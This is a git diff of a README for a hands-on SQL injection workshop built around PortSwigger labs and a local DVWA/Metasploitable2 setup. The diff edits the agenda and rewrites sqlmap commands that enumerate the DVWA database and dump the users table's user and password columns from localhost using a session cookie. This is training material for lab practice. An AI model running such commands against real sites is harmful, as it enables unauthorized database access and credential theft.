@@ -1,4 +1,4 @@
-# SQL Injection Vulnerability
+# Hand-on SQL Injection Workshop :D
 
 ## Agenda
 
@@ -11,7 +11,7 @@
 - SQL Injection in Action => (Let's Hack! ^^)
 
   - Practicing with PortSwigger SQL Injection Labs
-    - Manual Exploitation via manipulating the URL for the GET request -> Notice the URL encoding
+    - Manual Exploitation via manipulating the URL for the GET request
     - Writing a Python Script to automate the exploitation process
   - Exploit MetaSpoitable2 VM
     - Security Level 0 => (No Protection) ==> Manual Exploitation via entering Payloads in the input fields
@@ -227,17 +227,21 @@ docker ps
 #### 2.3.2 Exploit the Vulnerability with SQL Map
 
 ```bash
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low"
+```
+
+```bash
 # Getting the databases
-sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --dbs
 
 # Getting the tables from the database
-sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --batch -D dvwa --tables
 
 # Getting the columns from the table
-sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users --columns
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" --batch -D dvwa -T users --columns
 
 # Dumping the data from the table
-sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users -C user,password --dump
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookies=" PHPSESSID=1d0b0b0b0b0b0b0b0b0b0b0b0b0b0b0b; security=low" -D dvwa -T users -C user,password --dump
 ```
 
 ### 2.4 Solving CTF Challenges
@@ -270,7 +274,8 @@ sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -D d
 
 ### My Resources
 
-- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
+- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/learning-path)
+
 - [PicoCTF SQL Injection](https://picoctf.org/practice-questions)
 - [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 - [SQL Map Docs](https://github.com/sqlmapproject/sqlmap)
